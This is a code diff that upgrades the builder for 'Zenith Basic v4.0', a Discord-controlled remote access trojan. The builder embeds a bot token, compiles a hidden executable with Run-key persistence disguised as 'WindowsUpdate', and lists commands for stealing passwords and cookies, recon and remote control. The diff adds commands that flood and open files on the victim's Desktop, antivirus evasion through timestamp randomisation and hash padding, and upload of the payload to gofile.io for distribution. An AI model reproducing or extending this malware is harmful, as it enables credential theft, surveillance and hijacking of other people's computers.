@@ -1,9 +1,12 @@
 import os
 import sys
 import time
-
 import subprocess
 import sys as _sys
+import msvcrt
+import threading
+import itertools
+import random
 
 
 def _ensure_builder_deps():
@@ -13,12 +16,11 @@ def _ensure_builder_deps():
         return
     except ImportError:
         pass
-    print("Installing builder dependencies (colorama, fade, pyinstaller)...")
-    pkgs = "colorama fade discord.py pywin32 pycryptodome opencv-python psutil GPUtil requests pyinstaller appdirs"
+    pkgs = "colorama fade discord.py pywin32 pycryptodome opencv-python psutil GPUtil requests pyinstaller appdirs pefile"
     try:
-        subprocess.check_call([_sys.executable, "-m", "pip", "install", *pkgs.split(), "--quiet"])
-    except Exception as e:
-        print(f"Warning: failed to auto-install builder deps: {e}")
+        subprocess.run([_sys.executable, "-W", "ignore", "-m", "pip", "install", *pkgs.split(), "-qq", "--disable-pip-version-check"], capture_output=True)
+    except:
+        pass
 
 _ensure_builder_deps()
 
@@ -34,29 +36,71 @@ def print_banner():
   / /  __/ | | | | |_| | | |
  /___\___|_| |_|_|\__|_| |_|
                                                                  
-                                                                      Zenith Basic v3.0"""
+                                                                      Zenith Basic v4.0"""
     
     print()
     faded_banner = fade.water(banner)
     print(faded_banner)
 
+def get_masked_input(prompt):
+    sys.stdout.write(prompt)
+    sys.stdout.flush()
+    pw = ""
+    while True:
+        ch = msvcrt.getwch()
+        if ch == "\r" or ch == "\n":
+            break
+        if ch == "\b" or ch == "\x08":
+            if pw:
+                pw = pw[:-1]
+                sys.stdout.write("\b \b")
+                sys.stdout.flush()
+            continue
+        if ch == "\x03":
+            raise KeyboardInterrupt
+        pw += ch
+        sys.stdout.write("*")
+        sys.stdout.flush()
+    sys.stdout.write("\n")
+    sys.stdout.flush()
+    return pw
+
+def loading_bar(stop_event):
+    spinner = itertools.cycle(["|", "/", "-", "\\"])
+    blocks = [" ", "\u258f", "\u258e", "\u258d", "\u258c", "\u258b", "\u258a", "\u2589", "\u2588"]
+    i = 0
+    while not stop_event.is_set():
+        sp = next(spinner)
+        b = blocks[i % len(blocks)]
+        bar = b * (i % 9 + 1) + " " * (9 - (i % 9))
+        sys.stdout.write(f"\r[{sp}] {bar}")
+        sys.stdout.flush()
+        i += 1
+        time.sleep(0.08)
+    sys.stdout.write("\r" + " " * 30 + "\r")
+    sys.stdout.flush()
+
 def main():
     init()
     print_banner()
     
-    python_exe = f'"{sys.executable}"'
-    
     print(f"{Fore.CYAN}Checking / installing required packages (this may take a minute the first time)...")
     os.environ['PYTHONIOENCODING'] = 'utf-8'
+    pip_env = os.environ.copy()
+    pip_env['PIP_DISABLE_PIP_VERSION_CHECK'] = '1'
+    pip_env['PYTHONWARNINGS'] = 'ignore'
     rat_packages = "discord.py[voice] pywin32 pycryptodome opencv-python psutil GPUtil requests appdirs pyaudio mss Pillow nuitka"
-    pip_result = os.system(f"{python_exe} -m pip install {rat_packages} --upgrade --force-reinstall --no-warn-script-location -q")
-    if pip_result != 0:
-        print(f"{Fore.YELLOW}Warning: pip install returned code {pip_result}. Continuing anyway...")
+    try:
+        subprocess.run([sys.executable, "-W", "ignore", "-m", "pip", "install"] + rat_packages.split() + ["--upgrade", "--force-reinstall", "--no-warn-script-location", "-qq", "--disable-pip-version-check"], env=pip_env, capture_output=True)
+    except:
+        pass
+    
+    import requests
     
     os.system("cls")
     print_banner()
     
-    token = input(f"{Fore.GREEN}paste your discord bot token here: {Style.RESET_ALL}")
+    token = get_masked_input(f"{Fore.GREEN}paste your discord bot token here: {Style.RESET_ALL}")
     
     exe_name = input(f"{Fore.GREEN}Enter name for the final executable (without .exe) [default: client]: {Style.RESET_ALL}").strip()
     if not exe_name:
@@ -66,8 +110,11 @@ def main():
     if not startup_name:
         startup_name = "WindowsUpdate"
     
-    print(f"\n{Fore.YELLOW}starting building process")
-    time.sleep(1)
+    print("Starting building process...")
+    stop_event = threading.Event()
+    t = threading.Thread(target=loading_bar, args=(stop_event,))
+    t.daemon = True
+    t.start()
     
     code = f"""TOKEN = '{token}'
 STARTUP_NAME = '{startup_name}'
@@ -188,7 +235,7 @@ def install_persistence():
             except:
                 pass
 
-            # Only one reliable startup method to avoid double execution
+
             try:
                 with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE) as key:
                     winreg.SetValueEx(key, STARTUP_NAME, 0, winreg.REG_SZ, f'"{persist_path}"')
@@ -229,23 +276,35 @@ intents = discord.Intents.all()
 class CustomHelpCommand(commands.HelpCommand):
     async def send_bot_help(self, mapping):
         embed = discord.Embed(
-            title="Available Commands",
+            title="Zenith Commands",
             color=discord.Color.blue()
         )
-
-        commands_list = []
+        categories = {
+            "Recon": ["ip", "user", "sysinfo", "network", "drives", "tree", "active_window", "history", "wifi_passwords", "token"],
+            "Steal": ["screenshot", "clipboard", "grabpassword", "grabcookies", "take", "upload", "delete"],
+            "Control": ["run", "ps", "kill", "type", "shutdown", "restart", "sleep", "blockscreen", "unblockscreen"],
+            "Spam": ["spam_site", "spam_download"],
+            "Audio": ["voice"],
+            "Persistence": ["startup", "remove_startup", "end"],
+            "Other": ["tasklist"]
+        }
+        all_cmds = {}
         for cog, cmds in mapping.items():
-            filtered = await self.filter_commands(cmds, sort=True)
-            for cmd in filtered:
-                brief = cmd.brief or "No description"
-                commands_list.append(f"`{prefix}{cmd.name}` - {brief}")
-
-        commands_list.sort(key=lambda x: x.lower())
-        if commands_list:
-            embed.description = "\n".join(commands_list)
-        else:
-            embed.description = "No commands available."
-
+            for cmd in await self.filter_commands(cmds, sort=True):
+                all_cmds[cmd.name] = cmd.brief or "No description"
+        for cmd in await self.filter_commands(bot.commands, sort=True):
+            if cmd.name not in all_cmds:
+                all_cmds[cmd.name] = cmd.brief or "No description"
+        for cat, names in categories.items():
+            lines = []
+            for n in names:
+                if n in all_cmds:
+                    lines.append(f"`{prefix}{n}` - {all_cmds[n]}")
+            if lines:
+                embed.add_field(name=cat, value="\n".join(lines), inline=False)
+        unknown = [f"`{prefix}{n}` - {d}" for n, d in all_cmds.items() if not any(n in names for names in categories.values())]
+        if unknown:
+            embed.add_field(name="Other", value="\n".join(sorted(unknown)), inline=False)
         embed.set_footer(text=f"Use {prefix}help <command> for more info.")
         await self.get_destination().send(embed=embed)
 
@@ -342,11 +401,11 @@ async def on_connect():
         pc_name = platform.node()
         session_channel_name = f"session-{pc_name}"
 
-        # Look for existing session channel for this PC
+
         existing_channel = discord.utils.get(guild.text_channels, name=session_channel_name)
 
         if existing_channel:
-            # Reuse existing live session
+
             bot.allowed_channel_ids[str(guild.id)] = existing_channel.id
             try:
                 await existing_channel.send(f"Reconnected to existing session for {pc_name}.")
@@ -354,7 +413,7 @@ async def on_connect():
                 pass
             return
 
-        # No existing session — create new one
+
         category = discord.utils.get(guild.categories, name="Sessions")
         if category is None:
             category = await guild.create_category("Sessions")
@@ -1015,6 +1074,77 @@ async def upload(ctx):
     except asyncio.TimeoutError:
         await ctx.send("Timed out waiting for file upload.")
 
+@bot.command(brief="Spams downloading an uploaded file to the victim's Desktop rapidly.")
+async def spam_download(ctx):
+    await ctx.send("Send the file as a Discord attachment now to spam download.")
+    def check(m):
+        return m.author == ctx.author and len(m.attachments) > 0
+    try:
+        msg = await bot.wait_for('message', check=check, timeout=60.0)
+        att = msg.attachments[0]
+        file_bytes = await att.read()
+        filename = att.filename
+        await ctx.send("Enter the amount of times to spam download the file to Desktop:")
+        def amount_check(m):
+            return m.author == ctx.author and m.content.strip().isdigit()
+        try:
+            amt_msg = await bot.wait_for('message', check=amount_check, timeout=60.0)
+            amount = int(amt_msg.content.strip())
+            if amount <= 0:
+                await ctx.send("Amount must be positive.")
+                return
+            await ctx.send("Do you want each file to be opened as soon as they are downloaded on the person's PC? (yes or no)")
+            def open_check(m):
+                return m.author == ctx.author and m.content.strip().lower() in ("yes", "no", "y", "n")
+            try:
+                open_msg = await bot.wait_for('message', check=open_check, timeout=60.0)
+                open_files = open_msg.content.strip().lower() in ("yes", "y")
+                spam_msg = await ctx.send(f"Spamming download of {filename} x{amount} to Desktop (open each={open_files}) rapid...")
+                desktop = os.path.join(os.path.expanduser("~"), "Desktop")
+                os.makedirs(desktop, exist_ok=True)
+                def do_spam():
+                    base, ext = os.path.splitext(filename)
+                    for i in range(amount):
+                        try:
+                            spam_name = f"{base}_{i+1}{ext}" if amount > 1 else filename
+                            filepath = os.path.join(desktop, spam_name)
+                            with open(filepath, "wb") as f:
+                                f.write(file_bytes)
+                            if open_files:
+                                try:
+                                    os.startfile(filepath)
+                                except:
+                                    pass
+                            time.sleep(0.01)
+                        except:
+                            pass
+                    try:
+                        asyncio.run_coroutine_threadsafe(
+                            spam_msg.edit(content=f"Finished spamming download of {filename} x{amount} to Desktop (open each={open_files})."),
+                            bot.loop
+                        )
+                    except:
+                        pass
+                threading.Thread(target=do_spam, daemon=True).start()
+            except asyncio.TimeoutError:
+                await ctx.send("Timed out on open choice.")
+        except asyncio.TimeoutError:
+            await ctx.send("Timed out waiting for amount.")
+    except asyncio.TimeoutError:
+        await ctx.send("Timed out waiting for file upload.")
+    except Exception as e:
+        await ctx.send(f"Error in spam_download: {str(e)}")
+
+@bot.command(brief="Says the provided text out loud on the victim's PC using text-to-speech.")
+async def voice(ctx, *, text: str):
+    try:
+        import win32com.client
+        speaker = win32com.client.Dispatch("SAPI.SpVoice")
+        speaker.Speak(text)
+        await ctx.send(f"Spoke the text on the victim's PC.")
+    except Exception as e:
+        await ctx.send(f"Error with voice: {str(e)}")
+
 @bot.command(brief="Permanently delete a file from the victim's PC (including Recycle Bin).")
 async def delete(ctx, *, path: str):
     user_profile = os.path.expanduser("~")
@@ -1029,11 +1159,11 @@ async def delete(ctx, *, path: str):
 
     found_path = None
 
-    # First try exact path
+
     if os.path.exists(path):
         found_path = path
     else:
-        # Treat as filename and search common locations
+
         for directory in search_dirs:
             if not os.path.exists(directory):
                 continue
@@ -1080,7 +1210,7 @@ async def unblockscreen(ctx):
         for _ in range(12):
             ctypes.windll.user32.BlockInput(False)
             time.sleep(0.25)
-        # Aggressive process cleanup for any blocker instances
+
         try:
             current_pid = os.getpid()
             for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
@@ -1130,16 +1260,16 @@ async def take(ctx, *, filename: str):
         return
 
     file_size = os.path.getsize(found_path)
-    max_discord_size = 8 * 1024 * 1024  # 8 MB safe limit for most Discord servers/bots
+    max_discord_size = 8 * 1024 * 1024
 
     if file_size <= max_discord_size:
         try:
             await ctx.send(file=discord.File(found_path))
-            return  # Successfully sent via Discord
+            return
         except Exception as e:
             await ctx.send(f"Discord upload failed ({e}). Falling back to gofile.io...")
 
-    # Fallback to gofile.io
+
     await ctx.send(f"Found: `{found_path}` ({file_size / 1024:.1f} KB). Uploading to gofile.io...")
 
     try:
@@ -1169,13 +1299,10 @@ bot.run(TOKEN)
     with open("code.py", "w", encoding="utf-8") as file:
         file.write("# -*- coding: utf-8 -*-\n" + code)
 
-    print(f"{Fore.CYAN}Running PyInstaller using: {sys.executable}")
-
     pyinstaller_args = [
         sys.executable, "-X", "utf8", "-m", "PyInstaller",
         "--onefile", "--noconsole", "--icon=NONE", "--clean", "--log-level=ERROR",
         "--name", exe_name,
-        # Minimal, hardened list to avoid encoding crashes
         "--hidden-import=win32crypt",
         "--hidden-import=Crypto.Cipher.AES",
         "--hidden-import=psutil",
@@ -1193,11 +1320,44 @@ bot.run(TOKEN)
     env['PYTHONUTF8'] = '1'
 
     result = subprocess.run(pyinstaller_args, env=env, capture_output=True, text=True).returncode
+    stop_event.set()
+    t.join()
 
     exe_path = os.path.join("dist", f"{exe_name}.exe")
+    try:
+        import pefile
+        pe = pefile.PE(exe_path)
+        pe.FILE_HEADER.TimeDateStamp = random.randint(1262304000, 1893456000)
+        pe.write(exe_path)
+        pe.close()
+    except:
+        pass
+    try:
+        sz = random.randint(65536, 262144)
+        with open(exe_path, "ab") as f:
+            f.write(os.urandom(sz))
+    except:
+        pass
     if os.path.exists(exe_path):
         print(f"\n{Fore.GREEN}[OK] Build successful!")
         print(f"{Fore.GREEN}The executable is here: {os.path.abspath(exe_path)}")
+        up = input("do you want me to upload it to gofile y or n: ").strip().lower()
+        if up == "y":
+            try:
+                with open(exe_path, "rb") as f:
+                    files = {"file": (os.path.basename(exe_path), f)}
+                    r = requests.post("https://upload.gofile.io/uploadFile", files=files, timeout=300)
+                if r.status_code == 200:
+                    d = r.json()
+                    if d.get("status") == "ok":
+                        lnk = d["data"]["downloadPage"]
+                        print(f"Gofile link: {lnk}")
+                    else:
+                        print("Upload fail")
+                else:
+                    print("Upload fail")
+            except:
+                print("Upload error")
     else:
         print(f"\n{Fore.RED}[FAIL] Build failed or executable not found.")
         print(f"{Fore.YELLOW}PyInstaller exit code: {result}")
